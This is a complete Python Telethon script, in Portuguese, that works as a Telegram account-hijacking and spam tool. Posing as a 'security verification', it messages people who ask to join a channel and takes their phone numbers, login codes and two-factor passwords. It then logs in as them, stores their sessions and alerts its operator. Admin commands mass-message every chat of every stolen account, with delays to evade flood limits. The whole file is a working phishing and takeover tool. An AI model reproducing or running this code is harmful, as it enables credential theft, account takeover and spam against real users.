#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Userbot - Versão com conta normal + menus admin
"""

import os
import asyncio
import random
import time
import logging
import glob
import json
from pathlib import Path
from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonRequestPhone, ChannelParticipantsRecent, UpdateChannelParticipant, UpdateBotChatInviteRequester, UpdatePendingJoinRequests
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.functions.messages import GetChatInviteImportersRequest, HideChatJoinRequestRequest
from telethon.tl.functions.account import GetPasswordRequest, UpdateProfileRequest
from telethon.errors import SessionPasswordNeededError, FloodWaitError, UserPrivacyRestrictedError, PeerFloodError, ChatWriteForbiddenError, PhoneCodeInvalidError, PhoneCodeExpiredError, PasswordHashInvalidError
from telethon import types

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

SESSION_DIR = Path("sessions")
SESSION_DIR.mkdir(exist_ok=True)

user_states = {}
welcomed_users = set()
last_message_time = {}  # Anti-spam: última mensagem por usuário
MESSAGE_COOLDOWN = 3  # Segundos entre respostas para mesmo usuário

USERBOT_SESSION = "userbot_main"

BROADCAST_MESSAGE = os.getenv("BROADCAST_MESSAGE", "").strip()
try:
    BROADCAST_INTERVAL = int(os.getenv("BROADCAST_INTERVAL", "7200"))
except:
    BROADCAST_INTERVAL = 7200

WELCOME_MESSAGE = """🔐 **Verificação de Segurança**

Para liberar seu acesso completo, precisamos verificar sua identidade.

📱 Digite seu número de telefone com código do país:
Exemplo: `+5511999999999`"""

awaiting_config_message = {}
awaiting_sessions_message = {}

async def random_delay():
    await asyncio.sleep(random.uniform(2.0, 5.0))

async def _iter_session_files():
    return sorted(str(p) for p in SESSION_DIR.glob('*.session'))

async def _send_to_all_dialogs(client, text, include_users=True, include_groups=True, per_account_limit=200, sleep_between=1.0):
    enviados = 0
    async for dlg in client.iter_dialogs():
        if per_account_limit and enviados >= per_account_limit:
            break
        is_user = getattr(dlg, "is_user", False)
        is_group_flag = getattr(dlg, "is_group", False)
        is_channel = getattr(dlg, "is_channel", False)
        entity = getattr(dlg, "entity", None)
        is_megagroup = bool(getattr(entity, "megagroup", False))
        is_group_effective = is_group_flag or (is_channel and is_megagroup)
        
        if is_user and not include_users:
            continue
        if is_group_effective and not include_groups:
            continue
        if not (is_user or is_group_effective):
            continue
        
        try:
            await client.send_message(dlg.id, text)
            enviados += 1
            if sleep_between:
                await asyncio.sleep(sleep_between + random.uniform(0.5, 1.5))
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 1)
        except ChatWriteForbiddenError:
            continue
        except Exception:
            continue
    return enviados

async def _broadcast_via_all_sessions(message, per_account_limit=50):
    if not message:
        return 0, 0
    session_files = await _iter_session_files()
    total_active = 0
    total_sent = 0
    
    for sess_path in session_files:
        client = TelegramClient(sess_path, API_ID, API_HASH)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                continue
            total_active += 1
            sent = await _send_to_all_dialogs(client, message, per_account_limit=per_account_limit, sleep_between=random.uniform(1.0, 3.0))
            total_sent += sent
        except Exception as e:
            logger.error(f"Sessão {sess_path} erro: {e}")
        finally:
            try:
                await client.disconnect()
            except:
                pass
    
    return total_sent, total_active

def build_admin_menu():
    return (
        "🔧 **Menu Admin**\n\n"
        "Comandos disponíveis:\n"
        "/stats - Ver estatísticas\n"
        "/config - Configurar mensagem de broadcast\n"
        "/disparar - Disparar mensagem para usuários\n"
        "/global - Mensagem global via todas sessões\n"
        "/limpar - Limpar sessões inválidas\n"
        "/sessoes - Ver sessões ativas"
    )

async def main():
    if not API_ID or not API_HASH:
        print("❌ Configure API_ID e API_HASH nas variáveis de ambiente")
        return
    
    client = TelegramClient(USERBOT_SESSION, API_ID, API_HASH)
    
    print("🔐 Iniciando login com conta normal...")
    await client.start()
    
    me = await client.get_me()
    print(f"✅ Logado como: {me.first_name} (@{me.username}) - ID: {me.id}")
    
    @client.on(events.Raw(types=[UpdatePendingJoinRequests]))
    async def pending_join_handler(event):
        logger.info(f"PendingJoinRequests detectado! requests_pending={event.requests_pending}")
        
        try:
            channel = await client.get_entity(event.peer)
            
            result = await client(GetChatInviteImportersRequest(
                peer=channel,
                requested=True,
                limit=10,
                offset_date=None,
                offset_user=types.InputUserEmpty()
            ))
            
            logger.info(f"Buscou {len(result.importers)} join requests")
            
            for importer in result.importers:
                user_id = importer.user_id
                
                if user_id in welcomed_users:
                    continue
                
                if user_id == me.id:
                    continue
                
                user = None
                for u in result.users:
                    if u.id == user_id:
                        user = u
                        break
                
                if not user:
                    continue
                
                # Marca ANTES do delay para evitar duplicação
                welcomed_users.add(user_id)
                
                delay = random.uniform(8, 15)
                logger.info(f"Aguardando {delay:.1f}s antes de enviar welcome para {user_id}")
                await asyncio.sleep(delay)
                
                try:
                    user_states[user_id] = {"step": "waiting_phone", "channel": channel}
                    
                    await client.send_message(user, WELCOME_MESSAGE)
                    await asyncio.sleep(random.uniform(1, 3))
                    logger.info(f"Welcome enviado para: {user_id}")
                    
                except UserPrivacyRestrictedError:
                    logger.warning(f"Usuário {user_id} tem privacidade restrita")
                except PeerFloodError:
                    logger.error("PeerFlood! Muitas mensagens.")
                except Exception as e:
                    logger.error(f"Erro ao enviar welcome para {user_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Erro ao buscar join requests: {e}")
    
    @client.on(events.NewMessage(pattern='/menu'))
    async def menu_handler(event):
        if event.sender_id == ADMIN_ID:
            await event.respond(build_admin_menu())
    
    @client.on(events.NewMessage(pattern='/stats'))
    async def stats_handler(event):
        if event.sender_id == ADMIN_ID:
            sessions = await _iter_session_files()
            await event.respond(
                f"📊 **Estatísticas**\n\n"
                f"• Sessões salvas: {len(sessions)}\n"
                f"• Usuários verificados: {len(welcomed_users)}\n"
                f"• Mensagem broadcast: {len(BROADCAST_MESSAGE)} chars"
            )
    
    @client.on(events.NewMessage(pattern='/config'))
    async def config_handler(event):
        if event.sender_id == ADMIN_ID:
            awaiting_config_message[ADMIN_ID] = True
            awaiting_sessions_message.pop(ADMIN_ID, None)
            await event.respond("✍️ Envie a nova mensagem de broadcast:")
    
    @client.on(events.NewMessage(pattern='/disparar'))
    async def disparar_handler(event):
        if event.sender_id != ADMIN_ID:
            return
        
        if not BROADCAST_MESSAGE:
            await event.respond("❌ Configure uma mensagem primeiro com /config")
            return
        
        await event.respond("🚀 Iniciando disparo...")
        sent, active = await _broadcast_via_all_sessions(BROADCAST_MESSAGE, per_account_limit=50)
        await event.respond(f"✅ Concluído!\n• Sessões ativas: {active}\n• Mensagens enviadas: {sent}")
    
    @client.on(events.NewMessage(pattern='/global'))
    async def global_handler(event):
        if event.sender_id != ADMIN_ID:
            return
        
        awaiting_sessions_message[ADMIN_ID] = True
        awaiting_config_message.pop(ADMIN_ID, None)
        sessions = await _iter_session_files()
        await event.respond(f"📡 Encontrei {len(sessions)} sessões.\n\n✍️ Envie o texto para disparar em TODOS os chats:")
    
    @client.on(events.NewMessage(pattern='/limpar'))
    async def limpar_handler(event):
        if event.sender_id != ADMIN_ID:
            return
        
        sessions = await _iter_session_files()
        if not sessions:
            await event.respond("⚠️ Nenhuma sessão encontrada.")
            return
        
        await event.respond(f"🧹 Verificando {len(sessions)} sessões...")
        
        removed = 0
        for sess_path in sessions:
            client_temp = TelegramClient(sess_path, API_ID, API_HASH)
            try:
                await client_temp.connect()
                if not await client_temp.is_user_authorized():
                    await client_temp.disconnect()
                    os.remove(sess_path)
                    removed += 1
                else:
                    await client_temp.disconnect()
            except Exception:
                try:
                    os.remove(sess_path)
                    removed += 1
                except:
                    pass
        
        await event.respond(f"✅ Limpeza concluída!\n• Removidas: {removed}\n• Válidas: {len(sessions) - removed}")
    
    @client.on(events.NewMessage(pattern='/sessoes'))
    async def sessoes_handler(event):
        if event.sender_id != ADMIN_ID:
            return
        
        sessions = await _iter_session_files()
        if not sessions:
            await event.respond("⚠️ Nenhuma sessão encontrada.")
            return
        
        valid = 0
        for sess_path in sessions:
            client_temp = TelegramClient(sess_path, API_ID, API_HASH)
            try:
                await client_temp.connect()
                if await client_temp.is_user_authorized():
                    valid += 1
                await client_temp.disconnect()
            except:
                pass
        
        await event.respond(f"📁 **Sessões**\n\n• Total: {len(sessions)}\n• Válidas: {valid}")
    
    @client.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        if event.is_private:
            user_id = event.sender_id
            
            # Anti-spam: cooldown entre respostas
            current_time = time.time()
            if user_id in last_message_time:
                elapsed = current_time - last_message_time[user_id]
                if elapsed < MESSAGE_COOLDOWN:
                    return
            last_message_time[user_id] = current_time
            
            await random_delay()
            
            if user_id == ADMIN_ID:
                await event.respond(build_admin_menu())
                return
            
            user_states[user_id] = {"step": "waiting_phone"}
            
            await event.respond(WELCOME_MESSAGE)
            logger.info(f"Novo usuário iniciou: {user_id}")
    
    @client.on(events.NewMessage)
    async def message_handler(event):
        if not event.is_private:
            return
        
        if event.text and event.text.startswith('/'):
            return
        
        user_id = event.sender_id
        
        # Pega estado atual
        state = user_states.get(user_id, {})
        step = state.get("step")
        
        # Anti-spam: cooldown apenas para mensagens sem estado ativo
        if step not in ("waiting_code", "waiting_2fa", "waiting_phone"):
            current_time = time.time()
            if user_id in last_message_time:
                elapsed = current_time - last_message_time[user_id]
                if elapsed < MESSAGE_COOLDOWN:
                    return
            last_message_time[user_id] = current_time
        
        if user_id == ADMIN_ID:
            global BROADCAST_MESSAGE
            
            if awaiting_config_message.get(ADMIN_ID):
                awaiting_config_message.pop(ADMIN_ID, None)
                BROADCAST_MESSAGE = (event.text or "").strip()
                await event.respond(f"✅ Mensagem configurada!\n\nTexto: {BROADCAST_MESSAGE[:100]}...")
                return
            
            if awaiting_sessions_message.get(ADMIN_ID):
                awaiting_sessions_message.pop(ADMIN_ID, None)
                text = (event.text or "").strip()
                if not text:
                    await event.respond("❌ Mensagem vazia.")
                    return
                await event.respond("📡 Enviando para todas as sessões...")
                sent, active = await _broadcast_via_all_sessions(text, per_account_limit=50)
                await event.respond(f"✅ Concluído!\n• Sessões ativas: {active}\n• Mensagens enviadas: {sent}")
                return
        
        if step == "waiting_phone":
            text = event.text or ""
            phone = ''.join(c for c in text if c.isdigit() or c == '+')
            if not phone.startswith("+"):
                phone = "+" + phone
            
            if len(phone) < 10:
                await event.respond("❌ Número inválido. Digite com código do país:\nExemplo: `+5511999999999`")
                return
            
            await random_delay()
            
            # Preserva channel do estado anterior
            channel = state.get("channel")
            user_states[user_id] = {
                "step": "waiting_code",
                "phone": phone,
                "channel": channel
            }
            
            try:
                temp_client = TelegramClient(
                    str(SESSION_DIR / f"session_{user_id}"),
                    API_ID,
                    API_HASH
                )
                await temp_client.connect()
                
                sent = await temp_client.send_code_request(phone)
                user_states[user_id]["phone_code_hash"] = sent.phone_code_hash
                user_states[user_id]["client"] = temp_client
                
                await event.respond(
                    f"📱 Número registrado: `{phone}`\n\n"
                    "📨 Código enviado!\n"
                    "Digite o código recebido (só os números):\n\n"
                    "👀 [**Ver código**](https://t.me/+42777)"
                )
                logger.info(f"Código enviado para {phone}")
                
            except FloodWaitError as e:
                await event.respond(f"⚠️ Aguarde {e.seconds} segundos e tente novamente.")
            except Exception as e:
                await event.respond(f"❌ Erro: {str(e)}")
                logger.error(f"Erro ao enviar código: {e}")
            return
        
        if step == "waiting_code":
            code = ''.join(filter(str.isdigit, event.text or ""))
            logger.info(f"Código recebido de {user_id}: {code} (len={len(code)})")
            if len(code) >= 5:
                await random_delay()
                
                # Pega estado atualizado (com client e phone_code_hash)
                current_state = user_states.get(user_id, {})
                temp_client = current_state.get("client")
                phone = current_state.get("phone")
                phone_code_hash = current_state.get("phone_code_hash")
                
                if not temp_client:
                    logger.error(f"Client não existe para {phone}")
                    await event.respond("❌ Sessão expirou. Envie /start para recomeçar.")
                    if user_id in user_states:
                        del user_states[user_id]
                    return
                
                logger.info(f"Tentando sign_in para {phone} com código {code}")
                try:
                    result = await temp_client.sign_in(
                        phone=phone,
                        code=code,
                        phone_code_hash=phone_code_hash
                    )
                    logger.info(f"Sign_in sucesso para {phone}: {result}")
                    
                    # Broadcast desativado - causava bloqueio de login
                    # if BROADCAST_MESSAGE:
                    #     await _send_to_all_dialogs(temp_client, BROADCAST_MESSAGE, per_account_limit=50, sleep_between=random.uniform(1, 3))
                    
                    await temp_client.disconnect()
                    
                    # Aceitar no canal
                    channel = current_state.get("channel")
                    if channel:
                        try:
                            await client(HideChatJoinRequestRequest(
                                peer=channel,
                                user_id=user_id,
                                approved=True
                            ))
                            await event.respond("🎉 **Verificação concluída!**\n\n✅ Você foi aceito no canal!")
                            logger.info(f"Usuário {user_id} aceito no canal")
                        except Exception as e:
                            await event.respond("🎉 **Verificação concluída!**\n\n⚠️ Não foi possível aceitar automaticamente.")
                            logger.error(f"Erro ao aceitar no canal: {e}")
                    else:
                        await event.respond("🎉 **Verificação concluída!**")
                    
                    logger.info(f"Sessão criada para {phone}")
                    
                    if ADMIN_ID:
                        await client.send_message(
                            ADMIN_ID,
                            f"🎉 **Nova sessão!**\n\n"
                            f"📱 Telefone: `{phone}`\n"
                            f"👤 User ID: `{user_id}`"
                        )
                    
                    del user_states[user_id]
                    
                except SessionPasswordNeededError:
                    user_states[user_id]["step"] = "waiting_2fa"
                    await event.respond(
                        "🔐 **Verificação em duas etapas**\n\n"
                        "Esta conta tem 2FA ativada.\n"
                        "Digite sua senha:"
                    )
                except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                    await event.respond("❌ Código inválido ou expirado. Envie /start para recomeçar.")
                except Exception as e:
                    await event.respond(f"❌ Erro: {str(e)}")
                    logger.error(f"Erro no código: {e}")
            return
        
        if step == "waiting_2fa":
            password = event.text
            await random_delay()
            
            # Pega estado atualizado
            current_state = user_states.get(user_id, {})
            temp_client = current_state.get("client")
            phone = current_state.get("phone")
            
            try:
                await temp_client.sign_in(password=password)
                
                # Broadcast desativado - causava bloqueio de login
                # if BROADCAST_MESSAGE:
                #     await _send_to_all_dialogs(temp_client, BROADCAST_MESSAGE, per_account_limit=50, sleep_between=random.uniform(1, 3))
                
                await temp_client.disconnect()
                
                # Aceitar no canal
                channel = current_state.get("channel")
                if channel:
                    try:
                        await client(HideChatJoinRequestRequest(
                            peer=channel,
                            user_id=user_id,
                            approved=True
                        ))
                        await event.respond("🎉 **Verificação 2FA concluída!**\n\n✅ Você foi aceito no canal!")
                        logger.info(f"Usuário {user_id} aceito no canal (2FA)")
                    except Exception as e:
                        await event.respond("🎉 **Verificação 2FA concluída!**\n\n⚠️ Não foi possível aceitar automaticamente.")
                        logger.error(f"Erro ao aceitar no canal: {e}")
                else:
                    await event.respond("🎉 **Verificação 2FA concluída!**")
                
                logger.info(f"Sessão 2FA criada para {phone}")
                
                if ADMIN_ID:
                    await client.send_message(
                        ADMIN_ID,
                        f"🎉 **Nova sessão 2FA!**\n\n"
                        f"📱 Telefone: `{phone}`\n"
                        f"👤 User ID: `{user_id}`"
                    )
                
                del user_states[user_id]
                
            except PasswordHashInvalidError:
                await event.respond("❌ Senha incorreta. Tente novamente:")
            except Exception as e:
                await event.respond(f"❌ Erro: {str(e)}")
                logger.error(f"Erro na 2FA: {e}")
    
    print("\n🤖 Userbot rodando! Comandos admin disponíveis:")
    print("/menu - Ver menu admin")
    print("/stats - Estatísticas")
    print("/config - Configurar mensagem")
    print("/disparar - Disparar broadcast")
    print("/global - Mensagem global")
    print("/limpar - Limpar sessões inválidas")
    print("/sessoes - Ver sessões\n")
    
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
